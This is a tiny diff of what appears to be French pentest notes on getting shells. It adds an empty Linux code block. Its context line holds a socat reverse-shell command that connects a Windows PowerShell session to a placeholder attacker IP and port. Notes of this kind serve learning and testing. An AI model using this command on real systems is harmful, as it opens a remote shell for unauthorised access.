@@ -24,4 +24,7 @@ PS C:\Users\user> socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
 ```
 
 2) Sur une machine linux
-3) 
+
+```shell
+
+```
